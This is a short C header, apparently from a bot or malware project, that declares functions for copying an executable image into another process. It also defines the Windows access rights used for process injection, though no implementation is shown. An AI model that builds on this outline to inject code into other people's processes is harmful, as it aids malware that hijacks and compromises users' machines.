#pragma once
#include "bot_structs.h"

#define INJECT_PROCESS_RIGHTS PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE

DWORD GetImageSize(DWORD dwBaseAddress);
BOOL CopyImageToProcess(HANDLE hProcess, DWORD dwBaseAddress);
BOOL SetRemoteVariable(HANDLE hProcess, LPVOID lpDestination, LPVOID lpSource);